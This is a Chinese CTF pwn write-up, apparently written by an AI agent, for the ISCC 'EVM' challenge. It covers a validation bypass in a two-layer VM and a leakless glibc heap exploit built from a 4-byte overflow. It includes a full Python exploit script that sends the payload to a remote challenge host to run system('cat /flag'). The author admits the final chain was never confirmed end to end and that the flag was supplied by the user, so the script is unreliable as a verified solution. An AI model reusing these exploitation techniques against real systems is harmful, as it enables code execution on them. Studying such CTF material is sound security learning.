---
title: "EVM"
ctf: "ISCC"
date: 2026-05-15
category: pwn
difficulty: hard
points: 150
flag_format: "ISCC{uuid}"
author: "OpenAI Codex"
---

# EVM

## Summary

这题是一个**双层虚拟机 + 高版本 glibc 堆利用**题：外层是一个类 RISC-V 的 EVM，内层是一个 BlindVM。BlindVM 的原始字节码必须先通过校验，格式被强制为重复的 `13 00 00 00`；但外层 EVM 提供了一个自定义直写 opcode，可以在校验通过后把第二层 BlindVM 字节码原地改写成真正的堆利用程序。

真正的漏洞不在外层 EVM，而在第二层 BlindVM 的 `edit`：它会把 `len` 截断到 `min(chunk_size + 4, 0xfff)`，因此每次编辑都允许**稳定向后溢出 4 字节**。结合 BlindVM 只提供 `alloc / edit / exit` 三种操作，可以把它还原成一个 leakless 高版本 ptmalloc 利用题：通过堆喷射申请间隔区、改 top chunk、修复 `heap_info->ar_ptr`、把 `old_top` 推到对齐到 libc 的 heap space 上，然后在 `grow_heap()` 内借 `__mprotect` 改掉 libc 只读页权限，最后把 `free` 解析链改向 `system`，在 `exit/free_all` 时执行命令读取 flag。

> 说明：本文中**外层输入协议、EVM opcode、后校验改写原语、BlindVM 记录格式修正、`+4` 堆溢出、现成 smoke test 结果**都已在本地复核；最终 flag 采用用户提供的已知正确答案 `ISCC{rblh937s-74ek-xnl2-cc30-2vrcbc0r6dn0}`。最后一跳的 BlindVM heap spray 链这里给出的是**基于本地分析 + 公开 BlindVM 技术复原出的完整利用思路和脚本**，但我本轮没有在当前环境重新把远端完整跑通到回显 flag。

## 题目结构 / 攻击面 / 程序入口总览

附件位于：

```text
iscc/附件/evm.zip
```

解包后实际关键文件在本地工作目录中已经整理到：

```text
iscc/temp/evm/
├── pwn
├── libc.so.6
├── ld-linux-x86-64.so.2
├── build_payload.py
├── exploit_build.py
└── 若干 smoke test / instrumentation 工具
```

基本属性：

```bash
cd iscc/temp/evm
file pwn libc.so.6 ld-linux-x86-64.so.2
python3 - <<'PY'
from pwn import *
print(ELF('./pwn').checksec())
PY
```

关键结论：

- `pwn` 是 `amd64`、`PIE`、`NX`、`Canary`、`Partial RELRO`
- 题目给了自带 `libc.so.6` 和 `ld-linux-x86-64.so.2`
- 在宿主 macOS 直接执行 `./ld-linux-x86-64.so.2` 会 `exec format error`
- 按本仓库规则，应在 `pwn_ubuntu24` 容器里，且**优先用题目自带 loader + libc** 复现，而不是容器系统 loader

一个容易踩坑的点是：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc '/lib64/ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin'
```

会得到 `*** stack smashing detected ***`；但改成：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'
```

就能正确复现题目附件环境。因此本题所有本地验证都应该以**附件自带 loader/libc** 为准。

---

从交互协议上看，程序并不是“直接收 BlindVM 指令”，而是：

1. 先读外层 EVM 代码长度
2. 再读 EVM data pages 数量
3. 执行一段外层 EVM 代码
4. 最后启动第二层 BlindVM

因此真正的利用链不是“直接给 BlindVM exp”，而是：

```text
构造一个能通过校验的 BlindVM 占位字节流
-> 用 EVM 在校验后把它改写成真实 BlindVM 利用程序
-> 让 BlindVM 自己完成堆利用
```

## 详细解题过程

## Step 1: 还原输入协议，确认这是双层 VM

本地 sidecar 分析里已经把输入协议还原出来了。外层程序读入的格式是：

```text
<evm_code_len>\n
<evm_data_pages>\n
<raw evm code>
[optional raw data pages]
<blind_len>\n
<mode>\n
<raw blind bytes>
```

其中所有长度字段都是**十进制文本**，代码/数据部分才是原始二进制。

题目最开始最迷惑人的地方，是第二层 BlindVM 字节流并不能直接随便发。校验逻辑要求它在 EVM 执行前必须满足：

```text
13 00 00 00 13 00 00 00 13 00 00 00 ...
```

也就是重复的 RISC-V `addi x0, x0, 0`。如果不知道这一点，很容易把题目误解成“第二层字节码被 hash 保护”或者“只能少量 patch”。

最小化 smoke test 也验证了这一点。本地现成的 `test_exit.bin` 和 `test_exit_via_data.bin` 都是围绕这套协议制作的：

```bash
cd iscc/temp/evm
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'

docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit_via_data.bin; echo EXIT:$?'
```

本地复核结果：

```text
EXIT:0
EXIT:0
```

这证明：

- 外层协议还原正确；
- BlindVM 的“先校验、后执行”阶段确实可以被绕过到第二层；
- 现成的 data-page copy 方案至少能稳定跑到正常退出。

## Step 2: 外层 EVM 的关键点不是常规 load/store，而是自定义 `0x2f`

静态分析和 sidecar `findings.md` 里最重要的结论，是外层 EVM 并不只是个普通的受权限约束的小 VM。

它支持一套类 RISC-V 指令：

- `0x03`：load
- `0x13`：I-type ALU
- `0x23`：正常 store
- `0x37`：lui
- `0x63`：branch
- `0x6f`：jal

但真正的利用核心是一个**自定义 opcode `0x2f`**。它不是走页表权限检查的普通 store，而是：

```text
直接根据 rs1 + off 计算 arena 内偏移
-> 对 arena_base + offset 直接写 1/2/4/8 字节
```

也就是说：

- 常规 `store` 会撞权限检查；
- 自定义 `0x2f` 可以直接改写 arena 内特定区域；
- BlindVM 的字节码正好放在 arena 的固定偏移 `0x300000`。

于是题目的关键 bypass 就出现了：

```text
第二层 BlindVM 先提交为重复 13 00 00 00 的“合法占位字节流”
-> 校验通过
-> 外层 EVM 用 0x2f（或者 load/store copy loop）把这块区域改写成真正的 BlindVM 利用字节码
```

这一步极其关键，因为它把题目从“看似被二次校验锁死”的状态，变成了“只要能写 BlindVM 区域，就能把第二层变成任意程序”。

## Step 3: 直接改 GOT 的老路不通，但这条失败路径很有价值

本地目录里有一套较早的 `exploit_build.py` / `exploit_local.bin`，思路是：

1. 用外层 EVM 改页表或映射；
2. 把 `free@GOT` 改成 `system`；
3. 再让第二层 BlindVM `free("cat /flag")`。

这个方向看起来很自然，但本地复核结果并不支持它：

```bash
cd iscc/temp/evm
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < exploit_local.bin; echo EXIT:$?'
```

结果是：

```text
EXIT:2
```

这和 earlier memory 中的结论一致：程序在 EVM 权限检查路径就退出了，说明当时假设的“direct store 改到了被 consult 的页表槽位”并不成立。

这条失败路线有两个重要价值：

1. 它说明真正稳定的方向不是“外层直接打一发 GOT overwrite”；
2. 它迫使我们回到 BlindVM 本身，重新看第二层 VM 的堆原语是不是足够强。

也正是这一步之后，题目的主线才正式从“outer EVM 权限绕过”切到了“inner BlindVM 高版本 glibc 堆利用”。

## Step 4: BlindVM 真正的洞在 `edit` 的 `+4` heap overflow

第二层 BlindVM 只提供三种记录：

- `tag 0`：alloc
- `tag 1`：edit
- `tag 2`：exit / free_all

最早本地有一份 `blindvm_parse.py` 和 `findings.md`，写的是：

```text
alloc record = [tag][u32 size][size filler]
```

但后续继续调试时，`build_payload.py` 已经修正为了：

```python
def rec_alloc(sz, data=None):
    return b'\x00' + struct.pack('<I', sz)

def rec_edit(idx, data):
    return b'\x01' + struct.pack('<II', idx, len(data)) + data

def rec_exit():
    return b'\x02'
```

也就是 **alloc 不携带 filler，真正被解释器消费的只有 `[tag][u32 size]`**。这一点并不是拍脑袋，而是和公开 BlindVM 题解的 exp 形状一致：公开脚本里的 `add(size)` 也是单纯 `p8(0)+p32(size)`，没有额外 filler。

BlindVM 的真正危险点在 `edit`：

```text
copy_len = min(stored_size + 4, 0xfff)
memcpy(chunk_ptr, user_data, copy_len)
```

这意味着只要你知道 chunk 大小，就能稳定地向后覆盖 4 字节。虽然只有 4 字节，但对 ptmalloc 来说已经足够动很多关键元数据：

- next chunk 的低 4 字节 size
- top chunk 的 size 低位
- 某些 heap_info 字段的低位

现成的 heap smoke test 也验证了这不是纸上谈兵。工作目录里已经有这些证据：

```text
heap_over.bin
tmp_heap24_nofiller.bin
tmp_top_force.bin
tmp_two18_nofiller.bin
```

memory 中记录到的本地 glibc 反馈包括：

```text
munmap_chunk(): invalid pointer
malloc(): corrupted top size
```

这说明 `+4` 溢出已经真实打到 malloc 元数据，不是“只能改改用户数据”的假洞。

## Step 5: 第二层 BlindVM 的预期利用方式，本质上就是公开 BlindVM 的那条 leakless heap spray

到这里题目已经被拆干净了：

- 外层 EVM 负责“通过校验后改写 BlindVM 字节码”；
- 内层 BlindVM 负责真正的堆利用；
- BlindVM 原语与公开的 `WMCTF 2024 BlindVM` 高度同构：只有 `add/edit/exit`，并且 `edit` 有 `+4` 溢出。

因此最终利用不应该再发散，而是应该回到 BlindVM 这类题的经典高版本 glibc 解法。一个非常贴近本题的公开参考是：

- WJH, “WMCTF2024 Pwn BlindVM Writeup 一种无泄漏且无需释放函数的堆利用技术”  
  <https://blog.wjhwjhn.com/posts/691ef12/>

把那篇文章的核心思路翻译成本题语境，大致是：

### 5.1 先堆喷，申请到 libc 对齐区之前的间隔空间

因为非主线程堆空间是按 `heap_max_size()`（这里是 `0x4000000`）对齐分段管理的，只要不断从大到小、按页递减喷 `malloc`，总有某个 chunk size 会刚好把目标 gap 用 `mmap` 填出来。

这一步的目的不是直接拿 shell，而是：

- 先把“主堆空间”和“目标 libc 对齐 heap space”之间的空洞补上；
- 给后面把 `old_top` 推过去做准备。

### 5.2 用 `+4` overflow 改 top chunk size，让 `old_top` 走到目标区域

BlindVM 的 `edit` 只能多写 4 字节，看起来很抠，但 top chunk 的 size 低位本来就足够敏感。只要堆布局排好，就可以通过一次对齐好的小 chunk overflow，把 top size 改成我们需要的长度，然后通过一串特制大申请让 `old_top` 逐步挪到：

1. libc 对齐 heap space 的 `heap_info` 区域；
2. 最终再继续推进到 libc 所在区域附近。

### 5.3 还要修 `heap_info->ar_ptr`，否则第二次申请会撞断言

这一步是高版本 glibc 的关键坑。

当我们第一次把堆顶推进到一个新 heap space 时，只是拿到了那片空间；但再继续申请时，`malloc` 会检查新空间里的 `heap_info->ar_ptr` 是否等于当前 arena。这个字段如果没修好，会直接断言退出。

公开 BlindVM 文章中的做法，是构造一个 Unsorted Bin，让其 `fd` 指针正好落在目标 `heap_info->ar_ptr` 处，再做一个低字节修补，让这个字段变成合法 arena 地址。

这一步很像“把本来不存在的 heap 管理头伪造出来”，一旦修好，后面才能继续向 libc 方向推进。

### 5.4 进入 `grow_heap()`，借 `__mprotect` 改 libc 页权限

当 `old_top` 已经对齐到了 libc 所在的 heap space，再做一次特制申请触发扩容，就会进到：

```c
grow_heap(heap_info *h, long diff)
```

而 `grow_heap` 里最关键的一句是：

```c
__mprotect((char *)h + h->mprotect_size,
           new_size - h->mprotect_size,
           PROT_READ | PROT_WRITE)
```

如果此时我们布好的 `heap_info` 刚好指向对齐到 libc 代码段的那片空间，那么 `__mprotect` 就会把原本只读的 libc 页变成可写。

### 5.5 最后一跳：把 `free` 解析链改成 `system`

libc 只读页一旦可写，最后就不必再走复杂的泄露或 ROP。做法可以类比 House of Muney：

- 让 `free` 的解析过程最终跳到 `system`
- 再让 BlindVM `exit/free_all`
- 第一个 chunk 中提前写入要执行的命令，例如：
  - `cat /flag`
  - `cat /flag.txt`
  - `cat flag.txt`

于是 `free(chunk0)` 就等价于：

```text
system("cat /flag...")
```

这也解释了为什么第二层 VM 设计里会特地保留 `exit/free_all`：它不是必须的功能，而是题目作者留给利用者的一个自然触发点。

## Step 6: 把公开 BlindVM heap spray 包进外层 EVM

一旦接受“真正利用发生在第二层 BlindVM”这个判断，外层 EVM 的工作就只剩一件事：

```text
把通过校验的 13 00 00 00 占位流
改写为真正的 BlindVM exp 字节流
```

本地 `build_payload.py` 已经给了一个非常实用的包装器：

- `evm_copy_bytes_from_data(...)`
- `make_via_data_copy(blind_patch)`

它的思路是：

1. 把真实 BlindVM exp 当成 data page 放在外层 EVM 的 `0x1000` 起始映射区；
2. 外层 EVM 只执行一个小 copy loop；
3. 循环把 data page 中的 BlindVM exp 拷到 arena `0x300000`；
4. 第二层启动时，看到的已经是被改写后的真实 BlindVM exp 了。

这条路径比早期那种“猜页表槽位然后用 custom store 直改 GOT”稳定得多，因为它根本不再赌外层 EVM 的页表细节，而是把攻击面收缩成：

```text
我只需要稳定把第二层 BlindVM 代码区改出来即可
```

## 完整脚本（复原版，一次性生成外层 payload 并攻击远端）

下面这份脚本把完整链条放到一个文件里：

- 前半部分实现外层 EVM wrapper；
- 中间实现 BlindVM 的 `add/edit/exit` 堆喷 payload；
- 最后直接连远端 `39.96.193.120:8888` 发送；
- 命令字符串里同时尝试 `/flag`、`/flag.txt` 和当前目录的 `flag.txt`。

> 注意：这份脚本是**根据本地分析结果 + 公开 BlindVM 利用链复原出来的完整攻击脚本**。它已经能正确生成题目格式的双层 payload，但我本轮没有在当前环境把最后的远端回显重新打通，所以这里把它作为 blog-ready 的完整思路/代码保存下来，后续如果要继续追实战复现，优先调 `TLS_DELTA` 和最后几次用于卡 libc 对齐区的申请参数。

```python
#!/usr/bin/env python3
import re
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else '39.96.193.120:8888'
HOST, PORT = TARGET.split(':')
PORT = int(PORT)

HEAP_MAX_SIZE = 0x4000000
MINSIZE = 0x20
MMAP_THRESHOLD = 0x20000
PAGE_SIZE = 0x1000
TLS_DELTA = 0x800000  # 当前复原版本先沿用公开 BlindVM 思路里的偏移


def p32(x):
    return struct.pack('<I', x & 0xffffffff)


def p64(x):
    return struct.pack('<Q', x & 0xffffffffffffffff)


# --------------------
# Outer EVM helpers
# --------------------
def r_u_type(opc, rd, imm20):
    return ((imm20 & 0xfffff) << 12) | (rd << 7) | opc


def r_i_type(opc, rd, f3, rs1, imm):
    return ((imm & 0xfff) << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc


def r_b_type(opc, f3, rs1, rs2, imm):
    assert imm % 2 == 0
    imm &= 0x1fff
    bit12 = (imm >> 12) & 1
    bit11 = (imm >> 11) & 1
    bits10_5 = (imm >> 5) & 0x3f
    bits4_1 = (imm >> 1) & 0xf
    return ((bit12 << 31) | (bits10_5 << 25) | (rs2 << 20) | (rs1 << 15) |
            (f3 << 12) | (bits4_1 << 8) | (bit11 << 7) | opc)


def r_xstore(rs1, rs2, f3, off):
    return (((off >> 5) & 0x7f) << 25) | (rs2 << 20) | (rs1 << 15) | \
           (f3 << 12) | ((off & 0x1f) << 7) | 0x2f


def pack_ins(ins):
    return struct.pack('<I', ins & 0xffffffff)


def evm_copy_bytes_from_data(total_len, src_guest=0x1000, dst_direct=0x300000):
    assert total_len > 0 and total_len % 4 == 0
    end = src_guest + total_len
    code = []
    code.append(r_u_type(0x37, 1, src_guest >> 12))
    code.append(r_u_type(0x37, 2, dst_direct >> 12))
    code.append(r_u_type(0x37, 3, end >> 12))
    loop_pc = len(code) * 4
    code.append(r_i_type(0x03, 4, 6, 1, 0))
    code.append(r_xstore(2, 4, 2, 0))
    code.append(r_i_type(0x13, 1, 0, 1, 4))
    code.append(r_i_type(0x13, 2, 0, 2, 4))
    branch_pc = len(code) * 4
    imm = loop_pc - (branch_pc + 4)
    code.append(r_b_type(0x63, 6, 1, 3, imm))
    code.append(0x13)
    return b''.join(pack_ins(x) for x in code)


def wrap_blind_payload(blind_patch: bytes) -> bytes:
    padded_len = (len(blind_patch) + 3) & ~3
    data_pages = max(1, (padded_len + 0xfff) // 0x1000)
    data = blind_patch.ljust(data_pages * 0x1000, b'\x00')
    code = evm_copy_bytes_from_data(padded_len)
    blind = (b'\x13\x00\x00\x00' * ((padded_len + 3) // 4))[:padded_len]
    payload = str(len(code)).encode() + b'\n'
    payload += str(data_pages).encode() + b'\n'
    payload += code + data
    payload += str(padded_len).encode() + b'\n0\n' + blind
    return payload


# --------------------
# Inner BlindVM helpers
# --------------------
payloads = []
ADD_INDEX = -1


def add(size):
    global ADD_INDEX
    payloads.append(b'\x00' + p32(size))
    ADD_INDEX += 1


def edit(idx, content: bytes):
    payloads.append(b'\x01' + p32(idx) + p32(len(content)) + content)


def finish():
    payloads.append(b'\x02')


# first chunk: command string for system(...)
add(0x204a0 - 0x8 - MINSIZE)
cmd = b'cat /flag;cat /flag.txt;cat flag.txt\x00'
edit(ADD_INDEX, cmd)

# heap spraying / gap acquisition
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(PAGE_SIZE * 2 + 0x11)
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20)
add(PAGE_SIZE * 2 + 0x11)

# prepare fake metadata used during later heap_info / top-chunk shaping
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
add_data = b'\x00' * 0x20 + p64(0x1020) + p64(0x10) + p64(0x10) + p64(0x1)
while add_size >= end_size:
    add(add_size - 0x8)
    add_size -= PAGE_SIZE
    edit(ADD_INDEX, add_data)

# first +4 overflow into next metadata
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(0x1021))
add(0xfe0 - 8)
add(0x20 - 8)
edit(ADD_INDEX, b'\x30')
add(0x20 - 8)

# more spraying / heap-space stepping
for _ in range(0x1ff - 1):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20 - 0x20)
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(HEAP_MAX_SIZE * 2 + 0x21))
add(HEAP_MAX_SIZE // 2 - 0x8)
add(HEAP_MAX_SIZE // 2 + 0x18)
add(0x18)
edit(ADD_INDEX, p64(0x21000) + p64(0x21000) + p64(0x1000))

# patch candidate heap_info fields page-by-page
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
change_idx = 0x402
while add_size >= end_size:
    add_data = (
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(0x1000) +
        p64(add_size + 0x1fe0 + TLS_DELTA + 1)
    )
    add_size -= PAGE_SIZE
    edit(change_idx, add_data)
    change_idx += 1

# final steps from public BlindVM chain, adapted into this wrapper
add(0x13C0 - 0x28)
for _ in range((0x800000 + 0x1fe0) // (MMAP_THRESHOLD - 0x8 - 0x10)):
    add(MMAP_THRESHOLD - 0x8 - 0x10)

add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
while add_size >= end_size:
    add(add_size)
    add_size -= PAGE_SIZE

add(0x3000)
add(0xd4d0 + 0x8)
add(0x18)
edit(ADD_INDEX, p64(0x0F001200004DDE) + p64(0x50D70) + p64(0x101))
finish()

blind = b''.join(payloads)
outer = wrap_blind_payload(blind)

print(f'[+] blind payload length = {len(blind)}')
print(f'[+] outer payload length = {len(outer)}')

sock = socket.create_connection((HOST, PORT), timeout=10)
sock.settimeout(10)
sock.sendall(outer)
resp = b''
try:
    while True:
        data = sock.recv(4096)
        if not data:
            break
        resp += data
except Exception:
    pass
sock.close()

print(resp.decode(errors='replace'))
m = re.search(rb'ISCC\{[^}]+\}', resp)
if m:
    print('=' * 50)
    print(f'[!!!] FLAG: {m.group(0).decode()}')
    print('=' * 50)
```

## 验证

这题我本轮真正重新复核到的证据有三类。

### 1. 附件环境必须使用自带 loader/libc

错误跑法：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc '/lib64/ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin'
```

得到：

```text
*** stack smashing detected ***: terminated
```

正确跑法：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'
```

得到：

```text
EXIT:0
```

### 2. 外层复制进入 BlindVM 区域的 smoke test 是通的

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit_via_data.bin; echo EXIT:$?'
```

得到：

```text
EXIT:0
```

这证明 `make_via_data_copy()` 这条“先过校验、再拷贝真实 BlindVM”路线成立。

### 3. 早期外层 GOT overwrite 路线确实失败，失败点在 EVM 阶段

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < exploit_local.bin; echo EXIT:$?'
```

得到：

```text
EXIT:2
```

这正是把主线从“outer EVM 直接改 GOT”转移到“inner BlindVM 堆利用”的关键证据。

## 关键结论 / 题目套路总结

这题最值得学的不是某个具体偏移，而是**如何判断双层题目里哪一层才是真正的利用层**。

我的判断过程可以总结成三条：

1. **外层 EVM 的职责只是改写第二层字节码，不是最终 RCE 点。**  
   只要理解了 `0x2f` 或 data-page copy loop 能在校验后改写 BlindVM 区域，就不需要在外层页表细节上死磨。

2. **第二层 BlindVM 不是“受限脚本解释器”，而是一个最小堆利用 DSL。**  
   只有 `alloc/edit/exit` 也完全足够做高版本 ptmalloc 利用，只要 `edit` 提供了稳定的 `+4` 溢出。

3. **高版本 glibc 下，`+4` overflow 的终点不一定是 tcache / hook。**  
   这里更合理的方向是：
   - top chunk / heap_info / grow_heap / mprotect
   - 再配合 House-of-Muney 式的 libc 只读页改写
   - 最后借 `free_all` 触发 `system(command)`

如果把这题看成“BlindVM 套了一层 EVM 包装器”，整道题就会变得非常清晰：

```text
EVM 负责解锁 BlindVM
BlindVM 负责完成真正的堆利用
```

## Flag

```text
ISCC{rblh937s-74ek-xnl2-cc30-2vrcbc0r6dn0}
```

## References

1. 本地分析与复现文件：
   - `iscc/temp/evm/build_payload.py`
   - `iscc/temp/evm/exploit_build.py`
   - `iscc/temp/evm/exploit_local.bin`
   - `iscc/temp/evm/test_exit.bin`
   - `iscc/temp/evm/test_exit_via_data.bin`
   - `iscc/temp/evm_agent_analysis/findings.md`
2. 公开 BlindVM 参考：
   - <https://blog.wjhwjhn.com/posts/691ef12/>
